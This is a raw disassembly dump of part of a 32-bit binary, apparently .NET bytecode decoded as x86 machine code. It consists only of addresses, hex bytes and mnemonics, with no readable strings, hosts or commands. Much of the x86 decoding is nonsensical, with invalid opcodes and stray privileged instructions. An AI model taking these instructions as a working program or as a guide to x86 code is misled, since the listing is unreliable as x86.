  40416e:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  404174:	45                   	inc    %ebp
  404175:	00 00                	add    %al,(%eax)
  404177:	06                   	push   %es
  404178:	dd 20                	frstor (%eax)
  40417a:	03 00                	add    (%eax),%eax
  40417c:	00 38                	add    %bh,(%eax)
  40417e:	d4 02                	aam    $0x2
  404180:	00 00                	add    %al,(%eax)
  404182:	07                   	pop    %es
  404183:	14 72                	adc    $0x72,%al
  404185:	23 06                	and    (%esi),%eax
  404187:	00 70 16             	add    %dh,0x16(%eax)
  40418a:	8d 03                	lea    (%ebx),%eax
  40418c:	00 00                	add    %al,(%eax)
  40418e:	01 14 14             	add    %edx,(%esp,%edx,1)
  404191:	14 28                	adc    $0x28,%al
  404193:	c2 00 00             	ret    $0x0
  404196:	0a 72 49             	or     0x49(%edx),%dh
  404199:	15 00 70 16 28       	adc    $0x28167000,%eax
  40419e:	c3                   	ret
  40419f:	00 00                	add    %al,(%eax)
  4041a1:	0a 2c 62             	or     (%edx,%eiz,2),%ch
  4041a4:	07                   	pop    %es
  4041a5:	14 72                	adc    $0x72,%al
  4041a7:	11 15 00 70 18 8d    	adc    %edx,0x8d187000
  4041ad:	03 00                	add    (%eax),%eax
  4041af:	00 01                	add    %al,(%ecx)
  4041b1:	13 08                	adc    (%eax),%ecx
  4041b3:	11 08                	adc    %ecx,(%eax)
  4041b5:	16                   	push   %ss
  4041b6:	14 a2                	adc    $0xa2,%al
  4041b8:	11 08                	adc    %ecx,(%eax)
  4041ba:	17                   	pop    %ss
  4041bb:	17                   	pop    %ss
  4041bc:	8d 03                	lea    (%ebx),%eax
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	01 13                	add    %edx,(%ebx)
  4041c2:	09 11                	or     %edx,(%ecx)
  4041c4:	09 16                	or     %edx,(%esi)
  4041c6:	7e 1b                	jle    0x4041e3
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	04 18                	add    $0x18,%al
  4041cc:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  4041d3:	14 14                	adc    $0x14,%al
  4041d5:	14 28                	adc    $0x28,%al
  4041d7:	c2 00 00             	ret    $0x0
  4041da:	0a 28                	or     (%eax),%ch
  4041dc:	2d 00 00 0a 0c       	sub    $0xc0a0000,%eax
  4041e1:	08 72 39             	or     %dh,0x39(%edx)
  4041e4:	05 00 70 6f c5       	add    $0xc56f7000,%eax
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  4041ee:	08 28                	or     %ch,(%eax)
  4041f0:	7a 00                	jp     0x4041f2
  4041f2:	00 06                	add    %al,(%esi)
  4041f4:	2b 06                	sub    (%esi),%eax
  4041f6:	08 28                	or     %ch,(%eax)
  4041f8:	79 00                	jns    0x4041fa
  4041fa:	00 06                	add    %al,(%esi)
  4041fc:	dd 9c 02 00 00 38 50 	fstpl  0x50380000(%edx,%eax,1)
  404203:	02 00                	add    (%eax),%al
  404205:	00 07                	add    %al,(%edi)
  404207:	14 72                	adc    $0x72,%al
  404209:	23 06                	and    (%esi),%eax
  40420b:	00 70 16             	add    %dh,0x16(%eax)
  40420e:	8d 03                	lea    (%ebx),%eax
  404210:	00 00                	add    %al,(%eax)
  404212:	01 14 14             	add    %edx,(%esp,%edx,1)
  404215:	14 28                	adc    $0x28,%al
  404217:	c2 00 00             	ret    $0x0
  40421a:	0a 72 5f             	or     0x5f(%edx),%dh
  40421d:	15 00 70 16 28       	adc    $0x28167000,%eax
  404222:	c3                   	ret
  404223:	00 00                	add    %al,(%eax)
  404225:	0a 2c 66             	or     (%esi,%eiz,2),%ch
  404228:	7e 1b                	jle    0x404245
  40422a:	00 00                	add    %al,(%eax)
  40422c:	04 18                	add    $0x18,%al
  40422e:	9a 28 c6 00 00 0a 2c 	lcall  $0x2c0a,$0xc628
  404235:	4e                   	dec    %esi
  404236:	07                   	pop    %es
  404237:	14 72                	adc    $0x72,%al
  404239:	11 15 00 70 18 8d    	adc    %edx,0x8d187000
  40423f:	03 00                	add    (%eax),%eax
  404241:	00 01                	add    %al,(%ecx)
  404243:	13 08                	adc    (%eax),%ecx
  404245:	11 08                	adc    %ecx,(%eax)
  404247:	16                   	push   %ss
  404248:	14 a2                	adc    $0xa2,%al
  40424a:	11 08                	adc    %ecx,(%eax)
  40424c:	17                   	pop    %ss
  40424d:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%ebp)
  404253:	13 09                	adc    (%ecx),%ecx
  404255:	11 09                	adc    %ecx,(%ecx)
  404257:	16                   	push   %ss
  404258:	7e 1b                	jle    0x404275
  40425a:	00 00                	add    %al,(%eax)
  40425c:	04 18                	add    $0x18,%al
  40425e:	9a a2 11 09 17 7e 1b 	lcall  $0x1b7e,$0x170911a2
  404265:	00 00                	add    %al,(%eax)
  404267:	04 19                	add    $0x19,%al
  404269:	9a 28 98 00 00 0a 28 	lcall  $0x280a,$0x9828
  404270:	0c 01                	or     $0x1,%al
  404272:	00 06                	add    %al,(%esi)
  404274:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404279:	08 14 14             	or     %dl,(%esp,%edx,1)
  40427c:	14 17                	adc    $0x17,%al
  40427e:	28 87 00 00 0a 26    	sub    %al,0x260a0000(%edi)
  404284:	dd 14 02             	fstl   (%edx,%eax,1)
  404287:	00 00                	add    %al,(%eax)
  404289:	38 c8                	cmp    %cl,%al
  40428b:	01 00                	add    %eax,(%eax)
  40428d:	00 07                	add    %al,(%edi)
  40428f:	14 72                	adc    $0x72,%al
  404291:	23 06                	and    (%esi),%eax
  404293:	00 70 16             	add    %dh,0x16(%eax)
  404296:	8d 03                	lea    (%ebx),%eax
  404298:	00 00                	add    %al,(%eax)
  40429a:	01 14 14             	add    %edx,(%esp,%edx,1)
  40429d:	14 28                	adc    $0x28,%al
  40429f:	c2 00 00             	ret    $0x0
  4042a2:	0a 72 6d             	or     0x6d(%edx),%dh
  4042a5:	15 00 70 16 28       	adc    $0x28167000,%eax
  4042aa:	c3                   	ret
  4042ab:	00 00                	add    %al,(%eax)
  4042ad:	0a 2c 55 07 14 72 11 	or     0x11721407(,%edx,2),%ch
  4042b4:	15 00 70 18 8d       	adc    $0x8d187000,%eax
  4042b9:	03 00                	add    (%eax),%eax
  4042bb:	00 01                	add    %al,(%ecx)
  4042bd:	13 08                	adc    (%eax),%ecx
  4042bf:	11 08                	adc    %ecx,(%eax)
  4042c1:	16                   	push   %ss
  4042c2:	14 a2                	adc    $0xa2,%al
  4042c4:	11 08                	adc    %ecx,(%eax)
  4042c6:	17                   	pop    %ss
  4042c7:	17                   	pop    %ss
  4042c8:	8d 03                	lea    (%ebx),%eax
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	01 13                	add    %edx,(%ebx)
  4042ce:	09 11                	or     %edx,(%ecx)
  4042d0:	09 16                	or     %edx,(%esi)
  4042d2:	7e 1b                	jle    0x4042ef
  4042d4:	00 00                	add    %al,(%eax)
  4042d6:	04 18                	add    $0x18,%al
  4042d8:	9a 28 c4 00 00 0a 8c 	lcall  $0x8c0a,$0xc428
  4042df:	7f 00                	jg     0x4042e1
  4042e1:	00 01                	add    %al,(%ecx)
  4042e3:	a2 11 09 a2 11       	mov    %al,0x11a20911
  4042e8:	08 14 14             	or     %dl,(%esp,%edx,1)
  4042eb:	14 28                	adc    $0x28,%al
  4042ed:	c2 00 00             	ret    $0x0
  4042f0:	0a 28                	or     (%eax),%ch
  4042f2:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  4042f7:	7a 00                	jp     0x4042f9
  4042f9:	00 06                	add    %al,(%esi)
  4042fb:	dd 9d 01 00 00 38    	fstpl  0x38000001(%ebp)
  404301:	51                   	push   %ecx
  404302:	01 00                	add    %eax,(%eax)
  404304:	00 07                	add    %al,(%edi)
  404306:	14 72                	adc    $0x72,%al
  404308:	23 06                	and    (%esi),%eax
  40430a:	00 70 16             	add    %dh,0x16(%eax)
  40430d:	8d 03                	lea    (%ebx),%eax
  40430f:	00 00                	add    %al,(%eax)
  404311:	01 14 14             	add    %edx,(%esp,%edx,1)
  404314:	14 28                	adc    $0x28,%al
  404316:	c2 00 00             	ret    $0x0
  404319:	0a 72 7d             	or     0x7d(%edx),%dh
  40431c:	15 00 70 16 28       	adc    $0x28167000,%eax
  404321:	c3                   	ret
  404322:	00 00                	add    %al,(%eax)
  404324:	0a 39                	or     (%ecx),%bh
  404326:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404327:	00 00                	add    %al,(%eax)
  404329:	00 7e 1b             	add    %bh,0x1b(%esi)
  40432c:	00 00                	add    %al,(%eax)
  40432e:	04 18                	add    $0x18,%al
  404330:	9a 28 c7 00 00 0a 39 	lcall  $0x390a,$0xc728
  404337:	91                   	xchg   %eax,%ecx
  404338:	00 00                	add    %al,(%eax)
  40433a:	00 7e 1c             	add    %bh,0x1c(%esi)
  40433d:	00 00                	add    %al,(%eax)
  40433f:	04 17                	add    $0x17,%al
  404341:	3b 81 00 00 00 17    	cmp    0x17000000(%ecx),%eax
  404347:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  40434b:	04 07                	add    $0x7,%al
  40434d:	14 72                	adc    $0x72,%al
  40434f:	11 15 00 70 18 8d    	adc    %edx,0x8d187000
  404355:	03 00                	add    (%eax),%eax
  404357:	00 01                	add    %al,(%ecx)
  404359:	13 08                	adc    (%eax),%ecx
  40435b:	11 08                	adc    %ecx,(%eax)
  40435d:	16                   	push   %ss
  40435e:	14 a2                	adc    $0xa2,%al
  404360:	11 08                	adc    %ecx,(%eax)
  404362:	17                   	pop    %ss
  404363:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404369:	13 09                	adc    (%ecx),%ecx
  40436b:	11 09                	adc    %ecx,(%ecx)
  40436d:	16                   	push   %ss
  40436e:	28 08                	sub    %cl,(%eax)
  404370:	01 00                	add    %eax,(%eax)
  404372:	06                   	push   %es
  404373:	a2 11 09 17 7e       	mov    %al,0x7e170911
  404378:	1b 00                	sbb    (%eax),%eax
  40437a:	00 04 19             	add    %al,(%ecx,%ebx,1)
  40437d:	9a 28 98 00 00 0a 28 	lcall  $0x280a,$0x9828
  404384:	0c 01                	or     $0x1,%al
  404386:	00 06                	add    %al,(%esi)
  404388:	a2 11 09 18 7e       	mov    %al,0x7e180911
  40438d:	1b 00                	sbb    (%eax),%eax
  40438f:	00 04 1a             	add    %al,(%edx,%ebx,1)
  404392:	9a a2 11 09 19 7e 1b 	lcall  $0x1b7e,$0x190911a2
  404399:	00 00                	add    %al,(%eax)
  40439b:	04 1b                	add    $0x1b,%al
  40439d:	9a a2 11 09 1a 7e 1b 	lcall  $0x1b7e,$0x1a0911a2
  4043a4:	00 00                	add    %al,(%eax)
  4043a6:	04 1c                	add    $0x1c,%al
  4043a8:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  4043af:	14 14                	adc    $0x14,%al
  4043b1:	14 28                	adc    $0x28,%al
  4043b3:	c2 00 00             	ret    $0x0
  4043b6:	0a 28                	or     (%eax),%ch
  4043b8:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  4043bd:	79 00                	jns    0x4043bf
  4043bf:	00 06                	add    %al,(%esi)
  4043c1:	18 80 1c 00 00 04    	sbb    %al,0x400001c(%eax)
  4043c7:	dd d1                	fst    %st(1)
  4043c9:	00 00                	add    %al,(%eax)
  4043cb:	00 38                	add    %bh,(%eax)
  4043cd:	85 00                	test   %eax,(%eax)
  4043cf:	00 00                	add    %al,(%eax)
  4043d1:	07                   	pop    %es
  4043d2:	14 72                	adc    $0x72,%al
  4043d4:	23 06                	and    (%esi),%eax
  4043d6:	00 70 16             	add    %dh,0x16(%eax)
  4043d9:	8d 03                	lea    (%ebx),%eax
  4043db:	00 00                	add    %al,(%eax)
  4043dd:	01 14 14             	add    %edx,(%esp,%edx,1)
  4043e0:	14 28                	adc    $0x28,%al
  4043e2:	c2 00 00             	ret    $0x0
  4043e5:	0a 72 85             	or     -0x7b(%edx),%dh
  4043e8:	15 00 70 16 28       	adc    $0x28167000,%eax
  4043ed:	c3                   	ret
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	0a 2c 63             	or     (%ebx,%eiz,2),%ch
  4043f3:	7e 1b                	jle    0x404410
  4043f5:	00 00                	add    %al,(%eax)
  4043f7:	04 18                	add    $0x18,%al
  4043f9:	9a 28 c7 00 00 0a 2d 	lcall  $0x2d0a,$0xc728
  404400:	55                   	push   %ebp
  404401:	7e 1c                	jle    0x40441f
  404403:	00 00                	add    %al,(%eax)
  404405:	04 18                	add    $0x18,%al
  404407:	33 4b 17             	xor    0x17(%ebx),%ecx
  40440a:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  40440e:	04 07                	add    $0x7,%al
  404410:	14 72                	adc    $0x72,%al
  404412:	11 15 00 70 18 8d    	adc    %edx,0x8d187000
  404418:	03 00                	add    (%eax),%eax
  40441a:	00 01                	add    %al,(%ecx)
  40441c:	13 08                	adc    (%eax),%ecx
  40441e:	11 08                	adc    %ecx,(%eax)
  404420:	16                   	push   %ss
  404421:	14 a2                	adc    $0xa2,%al
  404423:	11 08                	adc    %ecx,(%eax)
  404425:	17                   	pop    %ss
  404426:	17                   	pop    %ss
  404427:	8d 03                	lea    (%ebx),%eax
  404429:	00 00                	add    %al,(%eax)
  40442b:	01 13                	add    %edx,(%ebx)
  40442d:	09 11                	or     %edx,(%ecx)
  40442f:	09 16                	or     %edx,(%esi)
  404431:	28 08                	sub    %cl,(%eax)
  404433:	01 00                	add    %eax,(%eax)
  404435:	06                   	push   %es
  404436:	a2 11 09 a2 11       	mov    %al,0x11a20911
  40443b:	08 14 14             	or     %dl,(%esp,%edx,1)
  40443e:	14 28                	adc    $0x28,%al
  404440:	c2 00 00             	ret    $0x0
  404443:	0a 28                	or     (%eax),%ch
  404445:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  40444a:	79 00                	jns    0x40444c
  40444c:	00 06                	add    %al,(%esi)
  40444e:	16                   	push   %ss
  40444f:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  404453:	04 de                	add    $0xde,%al
  404455:	47                   	inc    %edi
  404456:	11 06                	adc    %eax,(%esi)
  404458:	17                   	pop    %ss
  404459:	d6                   	salc
  40445a:	13 06                	adc    (%esi),%eax
  40445c:	11 06                	adc    %eax,(%esi)
  40445e:	11 07                	adc    %eax,(%edi)
  404460:	8e b7 3f cc fb ff    	mov    -0x433c1(%edi),%?
  404466:	ff 11                	call   *(%ecx)
  404468:	04 17                	add    $0x17,%al
  40446a:	d6                   	salc
  40446b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40446e:	04 11                	add    $0x11,%al
  404470:	05 8e b7 3f 8e       	add    $0x8e3fb78e,%eax
  404475:	fb                   	sti
  404476:	ff                   	(bad)
  404477:	ff                   	lcall  (bad)
  404478:	de 23                	fisubs (%ebx)
  40447a:	25 28 2e 00 00       	and    $0x2e28,%eax
  40447f:	0a 0d 72 8d 15 00    	or     0x158d72,%cl
  404485:	70 09                	jo     0x404490
  404487:	6f                   	outsl  %ds:(%esi),(%dx)
  404488:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404489:	00 00                	add    %al,(%eax)
  40448b:	0a 28                	or     (%eax),%ch
  40448d:	2b 00                	sub    (%eax),%eax
  40448f:	00 0a                	add    %cl,(%edx)
  404491:	28 7a 00             	sub    %bh,0x0(%edx)
  404494:	00 06                	add    %al,(%esi)
  404496:	28 30                	sub    %dh,(%eax)
  404498:	00 00                	add    %al,(%eax)
  40449a:	0a de                	or     %dh,%bl
  40449c:	00 2a                	add    %ch,(%edx)
  40449e:	00 00                	add    %al,(%eax)
  4044a0:	41                   	inc    %ecx
  4044a1:	1c 00                	sbb    $0x0,%al
	...
  4044ab:	00 8e 04 00 00 8e    	add    %cl,-0x71fffffc(%esi)
  4044b1:	04 00                	add    $0x0,%al
  4044b3:	00 23                	add    %ah,(%ebx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	00 32                	add    %dh,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	01 1b                	add    %ebx,(%ebx)
  4044bd:	30 03                	xor    %al,(%ebx)
  4044bf:	00 26                	add    %ah,(%esi)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 18                	add    %bl,(%eax)
  4044c5:	00 00                	add    %al,(%eax)
  4044c7:	11 72 ab             	adc    %esi,-0x55(%edx)
  4044ca:	15 00 70 7e 0a       	adc    $0xa7e7000,%eax
  4044cf:	00 00                	add    %al,(%eax)
  4044d1:	04 02                	add    $0x2,%al
  4044d3:	28 39                	sub    %bh,(%ecx)
  4044d5:	00 00                	add    %al,(%eax)
  4044d7:	0a 28                	or     (%eax),%ch
  4044d9:	45                   	inc    %ebp
  4044da:	00 00                	add    %al,(%eax)
  4044dc:	06                   	push   %es
  4044dd:	de 0e                	fimuls (%esi)
  4044df:	25 28 2e 00 00       	and    $0x2e28,%eax
  4044e4:	0a 0a                	or     (%edx),%cl
  4044e6:	28 30                	sub    %dh,(%eax)
  4044e8:	00 00                	add    %al,(%eax)
  4044ea:	0a de                	or     %dh,%bl
  4044ec:	00 2a                	add    %ch,(%edx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	01 10                	add    %edx,(%eax)
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	00 00                	add    %al,(%eax)
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	17                   	pop    %ss
  4044f9:	17                   	pop    %ss
  4044fa:	00 0e                	add    %cl,(%esi)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	03 00                	add    (%eax),%eax
  404504:	26 00 00             	add    %al,%es:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 72 39             	adc    %esi,0x39(%edx)
  40450e:	05 00 70 7e 0a       	add    $0xa7e7000,%eax
  404513:	00 00                	add    %al,(%eax)
  404515:	04 02                	add    $0x2,%al
  404517:	28 39                	sub    %bh,(%ecx)
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 28                	or     (%eax),%ch
  40451d:	45                   	inc    %ebp
  40451e:	00 00                	add    %al,(%eax)
  404520:	06                   	push   %es
  404521:	de 0e                	fimuls (%esi)
  404523:	25 28 2e 00 00       	and    $0x2e28,%eax
  404528:	0a 0a                	or     (%edx),%cl
  40452a:	28 30                	sub    %dh,(%eax)
  40452c:	00 00                	add    %al,(%eax)
  40452e:	0a de                	or     %dh,%bl
  404530:	00 2a                	add    %ch,(%edx)
  404532:	00 00                	add    %al,(%eax)
  404534:	01 10                	add    %edx,(%eax)
  404536:	00 00                	add    %al,(%eax)
  404538:	00 00                	add    %al,(%eax)
  40453a:	00 00                	add    %al,(%eax)
  40453c:	17                   	pop    %ss
  40453d:	17                   	pop    %ss
  40453e:	00 0e                	add    %cl,(%esi)
  404540:	32 00                	xor    (%eax),%al
  404542:	00 01                	add    %al,(%ecx)
  404544:	1b 30                	sbb    (%eax),%esi
  404546:	05 00 d4 00 00       	add    $0xd400,%eax
  40454b:	00 1e                	add    %bl,(%esi)
  40454d:	00 00                	add    %al,(%eax)
  40454f:	11 73 a3             	adc    %esi,-0x5d(%ebx)
  404552:	00 00                	add    %al,(%eax)
  404554:	06                   	push   %es
  404555:	0a 06                	or     (%esi),%al
  404557:	02 17                	add    (%edi),%dl
  404559:	8d 3d 00 00 01 13    	lea    0x13010000,%edi
  40455f:	07                   	pop    %es
  404560:	11 07                	adc    %eax,(%edi)
  404562:	16                   	push   %ss
  404563:	1f                   	pop    %ds
  404564:	3a 9d 11 07 6f 44    	cmp    0x446f0711(%ebp),%bl
  40456a:	00 00                	add    %al,(%eax)
  40456c:	0a 16                	or     (%esi),%dl
  40456e:	9a 7d 20 00 00 04 06 	lcall  $0x604,$0x207d
  404575:	02 17                	add    (%edi),%dl
  404577:	8d 3d 00 00 01 13    	lea    0x13010000,%edi
  40457d:	07                   	pop    %es
  40457e:	11 07                	adc    %eax,(%edi)
  404580:	16                   	push   %ss
  404581:	1f                   	pop    %ds
  404582:	3a 9d 11 07 6f 44    	cmp    0x446f0711(%ebp),%bl
  404588:	00 00                	add    %al,(%eax)
  40458a:	0a 17                	or     (%edi),%dl
  40458c:	9a 7d 21 00 00 04 02 	lcall  $0x204,$0x217d
  404593:	17                   	pop    %ss
  404594:	8d 3d 00 00 01 13    	lea    0x13010000,%edi
  40459a:	07                   	pop    %es
  40459b:	11 07                	adc    %eax,(%edi)
  40459d:	16                   	push   %ss
  40459e:	1f                   	pop    %ds
  40459f:	3a 9d 11 07 6f 44    	cmp    0x446f0711(%ebp),%bl
  4045a5:	00 00                	add    %al,(%eax)
  4045a7:	0a 18                	or     (%eax),%bl
  4045a9:	9a 28 c4 00 00 0a 1f 	lcall  $0x1f0a,$0xc428
  4045b0:	3c d8                	cmp    $0xd8,%al
  4045b2:	0c 08                	or     $0x8,%al
  4045b4:	6c                   	insb   (%dx),%es:(%edi)
  4045b5:	28 c8                	sub    %cl,%al
  4045b7:	00 00                	add    %al,(%eax)
  4045b9:	0a 0d 73 c9 00 00    	or     0xc973,%cl
  4045bf:	0a 0b                	or     (%ebx),%cl
  4045c1:	07                   	pop    %es
  4045c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c3:	ca 00 00             	lret   $0x0
  4045c6:	0a 2b                	or     (%ebx),%ch
  4045c8:	34 16                	xor    $0x16,%al
  4045ca:	13 05 06 25 fe 07    	adc    0x7fe2506,%eax
  4045d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4045d1:	00 00                	add    %al,(%eax)
  4045d3:	06                   	push   %es
  4045d4:	73 31                	jae    0x404607
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 73 32             	or     0x32(%ebx),%dh
  4045db:	00 00                	add    %al,(%eax)
  4045dd:	0a 13                	or     (%ebx),%dl
  4045df:	04 11                	add    $0x11,%al
  4045e1:	04 6f                	add    $0x6f,%al
  4045e3:	33 00                	xor    (%eax),%eax
  4045e5:	00 0a                	add    %cl,(%edx)
  4045e7:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  4045ed:	11 05 1f 13 31 d9    	adc    %eax,0xd931131f
  4045f3:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  4045f9:	2c 00                	sub    $0x0,%al
  4045fb:	00 0a                	add    %cl,(%edx)
  4045fd:	09 07                	or     %eax,(%edi)
  4045ff:	6f                   	outsl  %ds:(%esi),(%dx)
  404600:	cb                   	lret
  404601:	00 00                	add    %al,(%eax)
  404603:	0a 28                	or     (%eax),%ch
  404605:	cc                   	int3
  404606:	00 00                	add    %al,(%eax)
  404608:	0a 2c 07             	or     (%edi,%eax,1),%ch
  40460b:	7e 10                	jle    0x40461d
  40460d:	00 00                	add    %al,(%eax)
  40460f:	04 2d                	add    $0x2d,%al
  404611:	b7 de                	mov    $0xde,%bh
  404613:	0f 25                	(bad)
  404615:	28 2e                	sub    %ch,(%esi)
  404617:	00 00                	add    %al,(%eax)
  404619:	0a 13                	or     (%ebx),%dl
  40461b:	06                   	push   %es
  40461c:	28 30                	sub    %dh,(%eax)
  40461e:	00 00                	add    %al,(%eax)
  404620:	0a de                	or     %dh,%bl
  404622:	00 2a                	add    %ch,(%edx)
  404624:	01 10                	add    %edx,(%eax)
  404626:	00 00                	add    %al,(%eax)
  404628:	00 00                	add    %al,(%eax)
  40462a:	00 00                	add    %al,(%eax)
  40462c:	c4                   	(bad)
  40462d:	c4 00                	les    (%eax),%eax
  40462f:	0f 32                	rdmsr
  404631:	00 00                	add    %al,(%eax)
  404633:	01 13                	add    %edx,(%ebx)
  404635:	30 08                	xor    %cl,(%eax)
  404637:	00 e3                	add    %ah,%bl
  404639:	00 00                	add    %al,(%eax)
  40463b:	00 1f                	add    %bl,(%edi)
  40463d:	00 00                	add    %al,(%eax)
  40463f:	11 73 cd             	adc    %esi,-0x33(%ebx)
  404642:	00 00                	add    %al,(%eax)
  404644:	0a 0c 02             	or     (%edx,%eax,1),%cl
  404647:	72 cd                	jb     0x404616
  404649:	05 00 70 15 16       	add    $0x16157000,%eax
  40464e:	28 95 00 00 0a 13    	sub    %dl,0x130a0000(%ebp)
  404654:	05 16 13 04 2b       	add    $0x2b041316,%eax
  404659:	2c 11                	sub    $0x11,%al
  40465b:	05 11 04 9a 0b       	add    $0xb9a0411,%eax
  404660:	08 07                	or     %al,(%edi)
  404662:	14 72                	adc    $0x72,%al
  404664:	b3 15                	mov    $0x15,%bl
  404666:	00 70 16             	add    %dh,0x16(%eax)
  404669:	8d 03                	lea    (%ebx),%eax
  40466b:	00 00                	add    %al,(%eax)
  40466d:	01 14 14             	add    %edx,(%esp,%edx,1)
  404670:	14 28                	adc    $0x28,%al
  404672:	c2 00 00             	ret    $0x0
  404675:	0a 28                	or     (%eax),%ch
  404677:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
  40467c:	ce                   	into
  40467d:	00 00                	add    %al,(%eax)
  40467f:	0a 11                	or     (%ecx),%dl
  404681:	04 17                	add    $0x17,%al
  404683:	d6                   	salc
  404684:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404687:	04 11                	add    $0x11,%al
  404689:	05 8e b7 32 cc       	add    $0xcc32b78e,%eax
  40468e:	1f                   	pop    %ds
  40468f:	1e                   	push   %ds
  404690:	0a 38                	or     (%eax),%bh
  404692:	82 00 00             	addb   $0x0,(%eax)
  404695:	00 28                	add    %ch,(%eax)
  404697:	cf                   	iret
  404698:	00 00                	add    %al,(%eax)
  40469a:	0a 13                	or     (%ebx),%dl
  40469c:	07                   	pop    %es
  40469d:	16                   	push   %ss
  40469e:	13 06                	adc    (%esi),%eax
  4046a0:	2b 60 11             	sub    0x11(%eax),%esp
  4046a3:	07                   	pop    %es
  4046a4:	11 06                	adc    %eax,(%esi)
  4046a6:	9a 0d 09 6f d0 00 00 	lcall  $0x0,$0xd06f090d
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	d1 00                	roll   $1,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	2c 02                	sub    $0x2,%al
  4046b5:	2b 45 08             	sub    0x8(%ebp),%eax
  4046b8:	09 6f d0             	or     %ebp,-0x30(%edi)
  4046bb:	00 00                	add    %al,(%eax)
  4046bd:	0a 6f d2             	or     -0x2e(%edi),%ch
  4046c0:	00 00                	add    %al,(%eax)
  4046c2:	0a 25 fe 07 d3 00    	or     0xd307fe,%ah
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	73 d4                	jae    0x4046a0
  4046cc:	00 00                	add    %al,(%eax)
  4046ce:	0a 28                	or     (%eax),%ch
  4046d0:	03 00                	add    (%eax),%eax
  4046d2:	00 2b                	add    %ch,(%ebx)
  4046d4:	2c 26                	sub    $0x26,%al
  4046d6:	06                   	push   %es
  4046d7:	1f                   	pop    %ds
  4046d8:	1e                   	push   %ds
  4046d9:	31 21                	xor    %esp,(%ecx)
  4046db:	16                   	push   %ss
  4046dc:	0a 72 c3             	or     -0x3d(%edx),%dh
  4046df:	15 00 70 09 6f       	adc    $0x6f097000,%eax
  4046e4:	d0 00                	rolb   $1,(%eax)
  4046e6:	00 0a                	add    %cl,(%edx)
  4046e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046e9:	d2 00                	rolb   %cl,(%eax)
  4046eb:	00 0a                	add    %cl,(%edx)
  4046ed:	72 d1                	jb     0x4046c0
  4046ef:	15 00 70 28 39       	adc    $0x39287000,%eax
  4046f4:	00 00                	add    %al,(%eax)
  4046f6:	0a 28                	or     (%eax),%ch
  4046f8:	79 00                	jns    0x4046fa
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	11 06                	adc    %eax,(%esi)
  4046fe:	17                   	pop    %ss
  4046ff:	d6                   	salc
  404700:	13 06                	adc    (%esi),%eax
  404702:	11 06                	adc    %eax,(%esi)
  404704:	11 07                	adc    %eax,(%edi)
  404706:	8e b7 32 98 06 17    	mov    0x17069832(%edi),%?
  40470c:	d6                   	salc
  40470d:	0a 20                	or     (%eax),%ah
  40470f:	e8 03 00 00 28       	call   0x28404717
  404714:	2c 00                	sub    $0x0,%al
  404716:	00 0a                	add    %cl,(%edx)
  404718:	7e 10                	jle    0x40472a
  40471a:	00 00                	add    %al,(%eax)
  40471c:	04 3a                	add    $0x3a,%al
  40471e:	74 ff                	je     0x40471f
  404720:	ff                   	(bad)
  404721:	ff 2a                	ljmp   *(%edx)
  404723:	00 1b                	add    %bl,(%ebx)
  404725:	30 04 00             	xor    %al,(%eax,%eax,1)
  404728:	96                   	xchg   %eax,%esi
  404729:	00 00                	add    %al,(%eax)
  40472b:	00 20                	add    %ah,(%eax)
  40472d:	00 00                	add    %al,(%eax)
  40472f:	11 03                	adc    %eax,(%ebx)
  404731:	39 88 00 00 00 17    	cmp    %ecx,0x17000000(%eax)
  404737:	28 99 00 00 0a 20    	sub    %bl,0x200a0000(%ecx)
  40473d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404740:	00 28                	add    %ch,(%eax)
  404742:	9a 00 00 0a 20 0f 27 	lcall  $0x270f,$0x200a0000
  404749:	00 00                	add    %al,(%eax)
  40474b:	28 9b 00 00 0a de    	sub    %bl,-0x21f60000(%ebx)
  404751:	0c 28                	or     $0x28,%al
  404753:	2e 00 00             	add    %al,%cs:(%eax)
  404756:	0a 28                	or     (%eax),%ch
  404758:	30 00                	xor    %al,(%eax)
  40475a:	00 0a                	add    %cl,(%edx)
  40475c:	de 00                	fiadds (%eax)
  40475e:	02 28                	add    (%eax),%ch
